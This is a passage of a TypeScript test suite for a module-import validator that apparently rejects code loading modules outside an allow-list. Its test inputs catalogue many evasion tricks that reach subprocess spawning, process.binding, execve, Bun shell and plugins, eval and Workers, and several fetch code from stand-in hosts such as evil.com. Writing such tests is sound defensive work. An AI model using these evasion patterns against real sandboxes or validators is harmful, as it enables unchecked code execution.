          `const loaders = {}; Object.assign.apply(Object,` +
          ` [loaders, { load: require }]); loaders.load("./unchecked.cjs");`,
          `const loaders = {}; Reflect.apply(Object.defineProperty, Object,` +
          ` [loaders, "load", { value: require }]); loaders.load("./unchecked.cjs");`,
          `const copy = Object.assign.bind(Object); const loaders = {};` +
          ` copy(loaders, { load: require }); loaders.load("./unchecked.cjs");`,
        ]
      ) {
        await assertRejects(
          async () => await validateHTTPImports(source, []),
          Error,
          "dynamic code generation",
          "an indirect property-copy intrinsic must fail closed",
        );
      }
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `import process from "node:process";` +
              ` const make = process.getBuiltinModule("node:vm");` +
              ` make.runInThisContext('import("https://blocked.example/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "getBuiltinModule must not recover a restricted runtime module",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `import process from "node:process";` +
              ` const { getBuiltinModule } = process; getBuiltinModule("node:module");`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a destructured getBuiltinModule remains a runtime module loader",
      );
      for (
        const moduleName of [
          "child_process",
          "cluster",
          "node:child_process",
          "node:cluster",
        ]
      ) {
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `process.getBuiltinModule("${moduleName}");`,
              [],
            ),
          Error,
          "dynamic code generation",
          `${moduleName} must not be recovered through process.getBuiltinModule`,
        );
        await assertRejects(
          async () => await validateHTTPImports(`require("${moduleName}");`, []),
          Error,
          "subprocess module loading",
          `${moduleName} must not be hidden behind a literal CommonJS require`,
        );
      }
    });

    it("should reject subprocess loaders and exported capability aliases", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const Command = Deno.Command;` +
              ` new Command(Deno.execPath(), { args: ["run", "-A",` +
              ` "https://blocked.example/mod.ts"] });`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a subprocess runtime can load modules outside the validated graph",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const { Command } = Deno;` +
              ` new Command(Deno.execPath(), { args: ["run", "-A",` +
              ` "https://blocked.example/mod.ts"] });`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a destructured subprocess constructor remains an unchecked module loader",
      );
      for (
        const source of [
          `Reflect.construct(Deno.Command, [Deno.execPath(), { args: ["run", "-A",` +
          ` "https://blocked.example/mod.ts"] }]).output();`,
          `const Command = Deno.Command; Reflect.construct(Command, [Deno.execPath(),` +
          ` { args: ["run", "-A", "https://blocked.example/mod.ts"] }]).output();`,
          `const commands = new Map([["run", Deno.Command]]);` +
          ` const Command = commands.get("run");` +
          ` new Command(Deno.execPath(), { args: ["run", "-A",` +
          ` "https://blocked.example/mod.ts"] }).output();`,
          `Reflect.apply(Reflect.construct, Reflect, [Deno.Command,` +
          ` ["deno", { args: ["run", "./x.ts"] }]]);`,
          `Reflect.construct.bind(Reflect)(Deno.Command,` +
          ` ["deno", { args: ["run", "./x.ts"] }]);`,
          `const args = [Deno.Command, ["deno", { args: ["run", "./x.ts"] }]];` +
          ` Reflect.apply(Reflect.construct, Reflect, args);`,
          `Reflect.construct.bind(Reflect, Deno.Command,` +
          ` ["deno", { args: ["run", "./x.ts"] }])();`,
          `const construct = Reflect.construct.bind(Reflect);` +
          ` construct(Deno.Command, ["deno", { args: ["run", "./x.ts"] }]);`,
          `const construct = Reflect.construct.bind(Reflect, Deno.Command,` +
          ` ["deno", { args: ["run", "./x.ts"] }]); construct();`,
          `const { bind } = Reflect.construct;` +
          ` const construct = bind.call(Reflect.construct, Reflect);` +
          ` construct(Deno.Command, ["deno", { args: ["run", "./x.ts"] }]);`,
        ]
      ) {
        await assertRejects(
          async () => await validateHTTPImports(source, []),
          Error,
          "dynamic code generation",
          "reflective construction and opaque storage must retain subprocess capability checks",
        );
      }
      await validateHTTPImports(
        `class Safe {} Reflect.construct(Safe, []);`,
        [],
      );
      await validateHTTPImports(
        `class Command {}` +
          `const Deno = { Command };` +
          `const Reflect = { construct: { bind: () => () => undefined } };` +
          `Reflect.construct.bind(Reflect, Deno.Command,` +
          ` ["deno", { args: ["run", "./x.ts"] }])();`,
        [],
      );
      await validateHTTPImports(
        `class Command {}` +
          `const Deno = { Command };` +
          `const { bind } = Reflect.construct;` +
          `const construct = bind.call(Reflect.construct, Reflect);` +
          `construct(Deno.Command, []);`,
        [],
      );
      for (const method of ["spawn", "spawnSync"]) {
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `Bun.${method}(["deno", "run", "https://blocked.example/mod.ts"]);`,
              [],
            ),
          Error,
          "dynamic code generation",
          `Bun.${method} can execute an unchecked module loader`,
        );
      }
      await validateHTTPImports(
        `const Command = Deno.Command;` +
          ` export const support = { Command: typeof Command === "function" };`,
        [],
      );
      await validateHTTPImports(
        `const Command = Deno.Command;` +
          ` export const supported = typeof Command === "function";`,
        [],
      );
      await validateHTTPImports(
        `const flag = true;` +
          ` export const supported = typeof (flag ? Deno.Command : undefined) === "function";`,
        [],
      );
      await validateHTTPImports(
        `const Command = Deno.Command;` +
          ` const supported = !!Command;` +
          ` if (Command) { exportSupport(supported); }` +
          ` function exportSupport(_supported: boolean) {}` +
          ` export { supported };`,
        [],
      );
      await validateHTTPImports(
        `const Command = Deno.Command;` +
          ` Command && registerSupport();` +
          ` function registerSupport() {}`,
        [],
      );
      await validateHTTPImports(
        `const Command = Deno.Command;` +
          ` switch (Command) { case undefined: break; default: registerSupport(); }` +
          ` function registerSupport() {}`,
        [],
      );
      for (
        const source of [
          `const Command = Deno.Command; Command || registerSupport();`,
          `const Command = Deno.Command; registerSupport() && Command;`,
        ]
      ) {
        await assertRejects(
          async () => await validateHTTPImports(source, []),
          Error,
          "dynamic code generation",
          "logical expressions must not expose a subprocess constructor alias",
        );
      }
      await validateHTTPImports(
        `let Command = Deno.Command; const Safe = class {};` +
          ` export const instance = new (Command &&= Safe)();`,
        [],
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `let Command = Deno.Command;` +
              ` new (Command ||= class {})("deno", { args: ["run", "./unchecked.ts"] });`,
            [],
          ),
        Error,
        "dynamic code generation",
        "logical assignment can preserve an existing subprocess constructor alias",
      );
      for (
        const source of [
          `const getCommand = () => Deno.Command;` +
          ` new (getCommand())(Deno.execPath(), { args: ["run", "./unchecked.ts"] });`,
          `function getCommand() { return Deno.Command; }` +
          ` new (getCommand())(Deno.execPath(), { args: ["run", "./unchecked.ts"] });`,
          `const getSpawn = () => Bun.spawn; getSpawn()(["deno", "run", "./unchecked.ts"]);`,
          `const getBuiltin = () => process.getBuiltinModule; getBuiltin()("node:test");`,
          `const getBinding = () => process.binding; getBinding()("spawn_sync").spawn({});`,
          `const getExecve = () => process.execve;` +
          ` getExecve()(process.execPath, [process.execPath, "./unchecked.cjs"], process.env);`,
        ]
      ) {
        await assertRejects(
          async () => await validateHTTPImports(source, []),
          Error,
          "dynamic code generation",
          "a local function return must retain its runtime loading capability",
        );
      }
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const getRequire = () => require; getRequire()("./unchecked.cjs");`,
            [],
          ),
        Error,
        "unconstrained dynamic import",
        "a returned CommonJS loader must not escape static graph validation",
      );
      for (
        const source of [
          `Bun.plugin({ name: "route", setup() {} });`,
          `const register = Bun.plugin; register({ name: "route", setup() {} });`,
          `const { plugin } = Bun; plugin({ name: "route", setup() {} });`,
          `export const register = Bun.plugin;`,
          `export default Bun.plugin;`,
        ]
      ) {
        await assertRejects(
          async () => await validateHTTPImports(source, []),
          Error,
          "dynamic code generation",
          "Bun.plugin can install unchecked source transforms",
        );
      }
      for (
        const source of [
          `process.execve(process.execPath, [process.execPath, "./unchecked.cjs"], process.env);`,
          `const run = process.execve;` +
          ` run(process.execPath, [process.execPath, "./unchecked.cjs"], process.env);`,
          `const processFns = {}; processFns.run = process.execve;` +
          ` processFns.run(process.execPath,` +
          ` [process.execPath, "./unchecked.cjs"], process.env);`,
          `const processFns = {}; processFns.execve = process.execve;` +
          ` processFns.execve(process.execPath,` +
          ` [process.execPath, "./unchecked.cjs"], process.env);`,
          `const { execve: run } = process;` +
          ` run(process.execPath, [process.execPath, "./unchecked.cjs"], process.env);`,
          `process.execve.call(process, process.execPath,` +
          ` [process.execPath, "./unchecked.cjs"], process.env);`,
          `process.execve.apply(process,` +
          ` [process.execPath, [process.execPath, "./unchecked.cjs"], process.env]);`,
          `process.execve.bind(process)(process.execPath,` +
          ` [process.execPath, "./unchecked.cjs"], process.env);`,
          `Reflect.apply(process.execve, process,` +
          ` [process.execPath, [process.execPath, "./unchecked.cjs"], process.env]);`,
          `export const run = process.execve;`,
          `import process from "node:process";` +
          ` process.execve(process.execPath, [process.execPath, "./unchecked.cjs"], process.env);`,
          `import * as processModule from "process";` +
          ` processModule.execve(processModule.execPath,` +
          ` [processModule.execPath, "./unchecked.cjs"], processModule.env);`,
          `import { execve as run, execPath, env } from "node:process";` +
          ` run(execPath, [execPath, "./unchecked.cjs"], env);`,
          `const processModule = await import("node:process");` +
          ` processModule.execve(processModule.execPath,` +
          ` [processModule.execPath, "./unchecked.cjs"], processModule.env);`,
          `const processModule = require("node:process");` +
          ` processModule.execve(processModule.execPath,` +
          ` [processModule.execPath, "./unchecked.cjs"], processModule.env);`,
          `const processModule = process.getBuiltinModule("node:process");` +
          ` processModule.execve(processModule.execPath,` +
          ` [processModule.execPath, "./unchecked.cjs"], processModule.env);`,
          `import processModule = require("node:process");` +
          ` processModule.execve(processModule.execPath,` +
          ` [processModule.execPath, "./unchecked.cjs"], processModule.env);`,
          `process.binding("spawn_sync").spawn({` +
          ` file: process.execPath, args: [process.execPath, "./unchecked.cjs"] });`,
          `process["binding"]("spawn" + "_sync").spawn({});`,
          `const bind = process.binding; bind("spawn_sync").spawn({});`,
          `const internals = {}; internals.bind = process.binding;` +
          ` internals.bind("spawn_sync").spawn({});`,
          `const internals = {}; internals.binding = process.binding;` +
          ` internals.binding("spawn_sync").spawn({});`,
          `const internals = Object.assign({}, { binding: process.binding });` +
          ` internals.binding("spawn_sync").spawn({});`,
          `const internals = {}; Object.assign.apply(Object,` +
          ` [internals, { binding: process.binding }]);` +
          ` internals.binding("spawn_sync").spawn({});`,
          `const internals = {}; Reflect.apply(Object.defineProperty, Object,` +
          ` [internals, "binding", { value: process.binding }]);` +
          ` internals.binding("spawn_sync").spawn({});`,
          `const copy = Object.assign.bind(Object); const internals = {};` +
          ` copy(internals, { binding: process.binding });` +
          ` internals.binding("spawn_sync").spawn({});`,
          `const { binding: bind } = process; bind("spawn_sync").spawn({});`,
          `process.binding.call(process, "spawn_sync").spawn({});`,
          `process.binding.apply(process, ["spawn_sync"]).spawn({});`,
          `process.binding.bind(process)("spawn_sync").spawn({});`,
          `Reflect.apply(process.binding, process, ["spawn_sync"]).spawn({});`,
          `process._linkedBinding("spawn_sync").spawn({});`,
          `export const bind = process.binding;`,
          `import processModule from "node:process";` +
          ` processModule.binding("spawn_sync").spawn({});`,
          `import * as processModule from "process";` +
          ` processModule.binding("spawn_sync").spawn({});`,
          `const processModule = require("node:process");` +
          ` processModule.binding("spawn_sync").spawn({});`,
          `const processModule = process.getBuiltinModule("node:process");` +
          ` processModule.binding("spawn_sync").spawn({});`,
          `import processModule = require("node:process");` +
          ` processModule.binding("spawn_sync").spawn({});`,
        ]
      ) {
        await assertRejects(
          async () => await validateHTTPImports(source, []),
          Error,
          "dynamic code generation",
          "process subprocess capabilities can execute an unchecked module loader",
        );
      }
      for (
        const source of [
          "Bun.$`${process.execPath} ./unchecked.ts`;",
          "const shell = Bun.$; shell`${process.execPath} ./unchecked.ts`;",
          "const { $: shell } = Bun; shell`${process.execPath} ./unchecked.ts`;",
          "Bun.$.bind(Bun)`${process.execPath} ./unchecked.ts`;",
          "export const shell = Bun.$;",
        ]
      ) {
        await assertRejects(
          async () => await validateHTTPImports(source, []),
          Error,
          "dynamic code generation",
          "Bun shell tags can execute an unchecked module loader",
        );
      }
      await assertRejects(
        async () => await validateHTTPImports(`export const RouteWorker = Worker;`, []),
        Error,
        "dynamic code generation",
        "a capability alias must not become opaque after crossing a module edge",
      );
    });

    it("should not treat erased TypeScript declarations as runtime bindings", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `import type { Function } from "./types.ts";` +
              ` const run = Function('return import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a type-only import is erased and leaves the global Function constructor live",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `declare const Worker: unknown; new Worker("https://blocked.example/mod.js");`,
            [],
          ),
        Error,
        "Worker",
        "a declare binding is erased and cannot shadow the global Worker constructor",
      );
      await validateHTTPImports(`import type { Session } from "node:inspector";`, []);
      await validateHTTPImports(`import { type Session } from "node:inspector";`, []);
      await validateHTTPImports(`export { type Context } from "node:vm";`, []);
    });

    it("should ignore locally shadowed subprocess capability names", async () => {
      await validateHTTPImports(
        `const Object = { getOwnPropertyDescriptor() {} };` +
          ` export default Object.getOwnPropertyDescriptor;`,
        [],
      );
      await validateHTTPImports(
        `const Bun = { plugin(_value: unknown) {} };` +
          ` Bun.plugin({}); export default Bun.plugin;`,
        [],
      );
      await validateHTTPImports(
        `const getCommand = (Deno: { Command: new () => object }) => Deno.Command;` +
          ` class LocalCommand {} new (getCommand({ Command: LocalCommand }))();`,
        [],
      );
      await validateHTTPImports(
        `const process = { execve() { return "local"; } }; process.execve();`,
        [],
      );
      await validateHTTPImports(
        `const process = { binding() { return { spawn() {} }; } };` +
          ` process.binding("spawn_sync").spawn({});`,
        [],
      );
      await validateHTTPImports(
        `const process = { binding() { return { spawn() {} }; } };` +
          ` export const getProcess = () => process;`,
        [],
      );
      await validateHTTPImports(
        `const Bun = { plugin() {} };` +
          ` export const getBun = () => ({ plugin: Bun.plugin });`,
        [],
      );
      await validateHTTPImports(
        `const Bun = { plugin() {} };` +
          ` const outer = () => ({ inner: () => ({ plugin: Bun.plugin }) });` +
          ` outer().inner().plugin({});`,
        [],
      );
      await validateHTTPImports(
        `const process = { binding() { return { spawn() {} }; } };` +
          ` const outer = () => ({ inner: { binding: process.binding } });` +
          ` outer().inner.binding("local").spawn({});`,
        [],
      );
      await validateHTTPImports(
        `class Command { constructor(_name: string) {} }` +
          ` const Deno = { Command };` +
          ` const outer = () => ({ inner: () => ({ Command: Deno.Command }) });` +
          ` new (outer().inner().Command)("local");`,
        [],
      );
      await validateHTTPImports(
        `const plugin = (_options: unknown) => undefined;` +
          ` const one = () => () => plugin; one()()({});`,
        [],
      );
      await validateHTTPImports(
        `const Bun = { plugin() {} };` +
          ` export default () => ({ inner: () => ({ plugin: Bun.plugin }) });`,
        [],
      );
      await validateHTTPImports(
        `const Bun = { plugin() {} };` +
          ` const getBunApi = () => [Bun.plugin]; getBunApi()[0]({});`,
        [],
      );
      await validateHTTPImports(
        `const process = { binding() { return () => ({ spawn() {} }); } };` +
          ` const get = () => ({ binding() { return process.binding; } });` +
          ` get().binding()("local")().spawn({});`,
        [],
      );
      await validateHTTPImports(
        `const Bun = { plugin() {} };` +
          ` const get = () => ({ get plugin() { return Bun.plugin; } }); get().plugin({});`,
        [],
      );
      await validateHTTPImports(
        `const process = { binding() { return () => ({ spawn() {} }); } };` +
          ` class Cap { static binding() { return process.binding; } }` +
          ` Cap.binding()("local")().spawn({});`,
        [],
      );
      await validateHTTPImports(
        `const Bun = { plugin() {} };` +
          ` class Cap { plugin() { return Bun.plugin; } } new Cap().plugin()({});`,
        [],
      );
      await validateHTTPImports(
        `const Bun = { plugin() {} };` +
          ` export default class Cap { static get plugin() { return Bun.plugin; } }`,
        [],
      );
      await validateHTTPImports(
        `const Bun = { plugin() {} }; const api = {};` +
          ` Object.defineProperty(api, "plugin", { get() { return Bun.plugin; } });` +
          ` api.plugin({});`,
        [],
      );
      await validateHTTPImports(
        `const Bun = { plugin() {} };` +
          ` class Cap { #plugin() { return Bun.plugin; }` +
          ` run() { return this.#plugin(); } } new Cap().run()({});`,
        [],
      );
      await validateHTTPImports(
        `const Bun = { plugin() {} };` +
          ` const getCap = () => class Cap { plugin() { return Bun.plugin; } };` +
          ` new (getCap())().plugin()({});`,
        [],
      );
      await validateHTTPImports(
        `const Bun = { plugin() {} };` +
          ` class Base { plugin() { return Bun.plugin; } }` +
          ` class Cap extends Base {} new Cap().plugin()({});`,
        [],
      );
      await validateHTTPImports(
        `const Bun = { plugin() {} };` +
          ` const holder = () => ({ Base: class { static plugin = Bun.plugin; } });` +
          ` class Cap extends holder().Base {} Cap.plugin({});`,
        [],
      );
      await validateHTTPImports(
        `const local = () => {};` +
          ` class Base { plugin() { return Bun.plugin; } }` +
          ` class Cap extends Base { plugin() { return local; } }` +
          ` new Cap().plugin({});`,
        [],
      );
      await validateHTTPImports(
        `const local = () => {}; const dangerous = { plugin: Bun.plugin };` +
          ` const safe = { ...dangerous, plugin: local }; safe.plugin({});`,
        [],
      );
      await validateHTTPImports(
        `const local = () => {}; const dangerous = { plugin: Bun.plugin };` +
          ` const safe = Object.assign({}, dangerous, { plugin: local });` +
          ` safe.plugin({});`,
        [],
      );
      await validateHTTPImports(
        `const local = () => {}; const safe = [Bun.plugin];` +
          ` safe[0] = local; safe[0]({});`,
        [],
      );
      await validateHTTPImports(
        `const local = () => {}; const safe = [Bun.plugin];` +
          ` class Cap { static field = (safe[0] = local); } safe[0]({});`,
        [],
      );
      await validateHTTPImports(
        `class A extends B {} class B extends A {} export default A;`,
        [],
      );
      await validateHTTPImports(`export function cycle() { return cycle; }`, []);
      await validateHTTPImports(`const cycle = () => cycle(); cycle().safe;`, []);
      await validateHTTPImports(
        'const Bun = { $() { return "local"; } }; Bun.$`ordinary text`;',
        [],
      );
      await validateHTTPImports(
        `import process from "node:process";` +
          ` export const cwd = process.cwd(); export const mode = process.env.NODE_ENV;`,
        [],
      );
      await validateHTTPImports(
        `import processModule = require("node:process"); export const cwd = processModule.cwd();`,
        [],
      );
    });

    it("should treat namespace bodies and enum members as executable code", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `namespace RouteNs { eval('import("https://blocked.example/mod.js")'); }`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a namespace body compiles to executable JavaScript, not to an erased type",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `namespace RouteNs {` +
              ` export const w = new Worker("https://blocked.example/mod.js", { type: "module" });` +
              ` }`,
            [],
          ),
        Error,
        "Worker",
        "a remote worker inside a namespace starts exactly as one at the top level does",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `namespace RouteNs { export const load = (u: string) => import(u); }`,
            [],
          ),
        Error,
        "unconstrained dynamic import",
        "a dynamic import inside a namespace escapes no differently",
      );
      await assertRejects(
        async () => await validateHTTPImports(`enum RouteEnum { A = eval("1") }`, []),
        Error,
        "dynamic code generation",
        "a computed enum member initializer executes at module evaluation",
      );
      // Ambient declarations stay erased, and ordinary namespace and enum
      // values keep loading.
      await validateHTTPImports(
        `declare namespace Ambient { const value: number; }` +
          ` namespace SafeNs { export const value = 1; }` +
          ` enum SafeEnum { A = 1, B = A * 2 }` +
          ` export const GET = () => new Response(String(SafeNs.value + SafeEnum.B));`,
        [],
      );
    });

    it("should not let loop-local bindings shadow global capabilities outside the loop", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `for (let Function of []) { void Function; }` +
              ` Function('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `for (let Worker of []) { void Worker; }` +
              ` new Worker("https://blocked.example/mod.js");`,
            [],
          ),
        Error,
        "Worker",
      );
    });

    it("should reject a Worker that loads a remote or non-literal module URL", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const w = new Worker("https://blocked.example/mod.js", { type: "module" });`,
            [],
          ),
        Error,
        "Worker",
        "a module worker fetching a remote URL bypasses the allow-list and must be rejected",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const w = new Worker("https://esm.sh/mod.js", { type: "module" });`,
            ["https://esm.sh"],
          ),
        Error,
        "Worker",
        "even an allow-listed origin is unconstrainable through a worker loader and must be rejected",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const url = resolveWorker(); const w = new Worker(url, { type: "module" });`,
            [],
          ),
        Error,
        "Worker",
        "a non-literal worker URL cannot be scanned and must fail closed",
      );
    });

    it("should reject remote Workers reached through global constructor aliases", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const RouteWorker = Worker; new RouteWorker("https://blocked.example/mod.js");`,
            [],
          ),
        Error,
        "Worker",
        "aliasing the global Worker constructor must not bypass URL validation",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `import RouteWorker = globalThis.Worker;` +
              ` new RouteWorker("https://blocked.example/mod.js");`,
            [],
          ),
        Error,
        "Worker",
        "a TypeScript import-equals value alias must retain Worker URL checks",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `new globalThis.Worker("https://blocked.example/mod.js", { type: "module" });`,
            [],
          ),
        Error,
        "Worker",
        "the Worker constructor exposed through the global object is the same loader",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const RouteWorker = Reflect.get(globalThis, "Wor" + "ker");` +
              ` new RouteWorker("https://blocked.example/mod.js");`,
            [],
          ),
        Error,
        "Worker",
        "reflective retrieval of the global Worker constructor must retain Worker URL checks",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const { Worker: RouteWorker } = globalThis;` +
              ` new RouteWorker("https://blocked.example/mod.js");`,
            [],
          ),
        Error,
        "Worker",
        "destructuring the global Worker constructor must retain Worker URL checks",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const { ["Wor" + "ker"]: RouteWorker } = globalThis;` +
              ` new RouteWorker("https://blocked.example/mod.js");`,
            [],
          ),
        Error,
        "Worker",
        "a computed destructuring key must retain Worker URL checks",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const RouteWorker = Worker;` +
              ` Reflect.construct(RouteWorker, ["https://blocked.example/mod.js", { type: "module" }]);`,
            [],
          ),
        Error,
        "Worker",
        "reflective construction must not bypass Worker URL validation",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const getWorker = () => Worker;` +
              ` new (getWorker())("https://blocked.example/mod.js", { type: "module" });`,
            [],
          ),
        Error,
        "Worker",
        "a returned Worker constructor must retain URL validation",
      );
    });

    it("should classify a Worker constructor assigned in the construction itself", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `new (W = Worker)("https://blocked.example/mod.js", { type: "module" });`,
            [],
          ),
        Error,
        "Worker",
        "an assignment expression callee evaluates to its right-hand side, the Worker loader",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `let W; new (W = Worker)("https://blocked.example/mod.js", { type: "module" });`,
            [],
          ),
        Error,
        "Worker",
        "a declared assignment target must not hide the construction either",
      );
    });

    it("should fail closed on Worker aliases when the capability parser is unavailable", async () => {
      __setSourceCapabilityParserLoaderForTests(() =>
        Promise.reject(new Error("parser unavailable"))
      );
      try {
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `const RouteWorker = Worker; new RouteWorker(remoteUrl);`,
              [],
            ),
          Error,
          "Worker",
          "the textual fallback must not accept an alias it cannot classify",
        );
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `const RouteWorker = Worker;` +
                ` new Worker("./safe-worker.ts", { type: "module" });` +
                ` new RouteWorker("./missed-worker.ts", { type: "module" });`,
              [],
            ),
          Error,
          "Worker",
          "a direct Worker must not hide an aliased construction from the textual fallback",
        );
      } finally {
        __setSourceCapabilityParserLoaderForTests();
      }
    });

    it("should reject capability factories exported across module boundaries", async () => {
      for (
        const source of [
          `export default function getBinding() { return process.binding; }`,
          `export function getBinding() { return process.binding; }`,
          `export default () => Bun.plugin;`,
          `export const getPlugin = () => Bun.plugin;`,
          `export default () => require;`,
          `export default () => process;`,
          `export function commandFactory() { return Deno.Command; }`,
          `export default async () => Bun.plugin;`,
          `export default () => ({ inner: () => ({ plugin: Bun.plugin }) });`,
          `export const getBinding = () => ({ inner: { binding: process.binding } });`,
          `export default () => [Bun.plugin];`,
          `export default () => ({ plugin() { return Bun.plugin; } });`,
          `export default class Cap { plugin() { return Bun.plugin; } }`,
          `export default class Cap { static get binding() { return process.binding; } }`,
        ]
      ) {
        await assertRejects(
          async () => await validateHTTPImports(source, []),
          Error,
          "dynamic code generation",
          "an exported factory must not launder a restricted runtime capability",
        );
      }
    });

    it("should reject restricted capabilities returned inside local object wrappers", async () => {
      for (
        const source of [
          `const getInternals = () => ({ binding: process.binding });` +
          ` getInternals().binding("spawn_sync").spawn({});`,
          `const getProc = () => ({ execve: process.execve });` +
          ` getProc().execve("/bin/sh", [], {});`,
          `const getBunApi = () => ({ plugin: Bun.plugin });` +
          ` getBunApi().plugin({ name: "route", setup() {} });`,
          `const getDenoApi = () => ({ Command: Deno.Command });` +
          ` new (getDenoApi().Command)("sh");`,
          `const getBinding = async () => process.binding;` +
          ` (await getBinding())("spawn_sync").spawn({});`,
          `const outer = () => ({ inner: () => ({ plugin: Bun.plugin }) });` +
          ` outer().inner().plugin({ name: "route", setup() {} });`,
          `const outer = () => ({ inner: () => ({ binding: process.binding }) });` +
          ` outer().inner().binding("spawn_sync").spawn({});`,
          `const outer = () => ({ inner: () => ({ Command: Deno.Command }) });` +
          ` new (outer().inner().Command)("sh");`,
          `const outer = () => ({ inner: { plugin: Bun.plugin } });` +
          ` outer().inner.plugin({ name: "route", setup() {} });`,
          `const outer = () => ({ inner: { binding: process.binding } });` +
          ` outer().inner.binding("spawn_sync").spawn({});`,
          `const one = () => () => Bun.plugin;` +
          ` one()()({ name: "route", setup() {} });`,
          `const getBunApi = () => [Bun.plugin]; getBunApi()[0]({});`,
          `const get = () => ({ binding() { return process.binding; } });` +
          ` get().binding()("spawn_sync").spawn({});`,
          `const get = () => ({ get plugin() { return Bun.plugin; } });` +
          ` get().plugin({});`,
          `class Cap { static binding() { return process.binding; } }` +
          ` Cap.binding()("spawn_sync").spawn({});`,
          `class Cap { static Command() { return Deno.Command; } }` +
          ` new (Cap.Command())("sh");`,
          `class Cap { plugin() { return Bun.plugin; } }` +
          ` new Cap().plugin()({});`,
          `class Cap { static get plugin() { return Bun.plugin; } } Cap.plugin({});`,
          `class Cap { plugin = Bun.plugin; } new Cap().plugin({});`,
          `const api = {};` +
          ` Object.defineProperty(api, "plugin", { get() { return Bun.plugin; } });` +
          ` api.plugin({});`,
          `const api = {};` +
          ` Object.defineProperty(api, "binding", { get: () => process.binding });` +
          ` api.binding("spawn_sync").spawn({});`,
          `class Cap { #plugin() { return Bun.plugin; }` +
          ` run() { return this.#plugin(); } } new Cap().run()({});`,
          `const getCap = () => class Cap { plugin() { return Bun.plugin; } };` +
          ` new (getCap())().plugin()({ name: "route", setup() {} });`,
          `const getCap = () => class Cap { get binding() { return process.binding; } };` +
          ` new (getCap())().binding("spawn_sync").spawn({});`,
          `const getCap = () => class Cap { Command = Deno.Command; };` +
          ` new (new (getCap())().Command)("sh");`,
          `const getCap = () => class Cap { ["plugin"]() { return Bun.plugin; } };` +
          ` new (getCap())().plugin()({ name: "route", setup() {} });`,
          `const root = () => ({ Cap: () => class { plugin() { return Bun.plugin; } } });` +
          ` new (root().Cap())().plugin()({ name: "route", setup() {} });`,
          `class Base { static binding() { return process.binding; } }` +
          ` class Cap extends Base {} Cap.binding()("spawn_sync").spawn({});`,
          `class Base { plugin() { return Bun.plugin; } }` +
          ` class Cap extends Base {}` +
          ` new Cap().plugin()({ name: "route", setup() {} });`,
          `class Base { plugin() { return Bun.plugin; } }` +
          ` class Cap extends Base { plugin() { return super.plugin(); } }` +
          ` new Cap().plugin()({ name: "route", setup() {} });`,
          `class Base { get plugin() { return Bun.plugin; } }` +
          ` class Cap extends Base { get plugin() { return super.plugin; } }` +
          ` new Cap().plugin({ name: "route", setup() {} });`,
          `class Base { static plugin() { return Bun.plugin; } }` +
          ` class Cap extends Base { static plugin() { return super.plugin(); } }` +
          ` Cap.plugin()({ name: "route", setup() {} });`,
          `class Base { static get plugin() { return Bun.plugin; } }` +
          ` class Cap extends Base { static get plugin() { return super.plugin; } }` +
          ` Cap.plugin({ name: "route", setup() {} });`,
          `class Base { get wrapper() { return { plugin: Bun.plugin }; } }` +
          ` class Cap extends Base { get plugin() { return super.wrapper.plugin; } }` +
          ` new Cap().plugin({ name: "route", setup() {} });`,
          `class Base { wrapper() { return { binding: process.binding }; } }` +
          ` class Cap extends Base { binding() { return super.wrapper().binding; } }` +
          ` new Cap().binding()("spawn_sync").spawn({});`,
          `class Base { get caps() { return [Bun.plugin]; } }` +
          ` class Cap extends Base { get plugin() { return super.caps[0]; } }` +
          ` new Cap().plugin({ name: "route", setup() {} });`,
          `class Base { caps() { return [Deno.Command]; } }` +
          ` class Cap extends Base { Command() { return super.caps()[0]; } }` +
          ` new (new Cap().Command())("sh");`,
          `class Base { get wrapper() {` +
          ` return { inner: { plugin: Bun.plugin } }; } }` +
          ` class Cap extends Base { get plugin() {` +
          ` return super.wrapper.inner.plugin; } }` +
          ` new Cap().plugin({ name: "route", setup() {} });`,
          `class Base { static get wrapper() { return { plugin: Bun.plugin }; } }` +
          ` class Cap extends Base { static get plugin() {` +
          ` return super.wrapper.plugin; } }` +
          ` Cap.plugin({ name: "route", setup() {} });`,
          `class Base { static wrapper() { return { binding: process.binding }; } }` +
          ` class Cap extends Base { static binding() {` +
          ` return super.wrapper().binding; } }` +
          ` Cap.binding()("spawn_sync").spawn({});`,
          `const holder = () => ({ Base: class { static Command = Deno.Command; } });` +
          ` class Cap extends holder().Base {} new Cap.Command("sh");`,
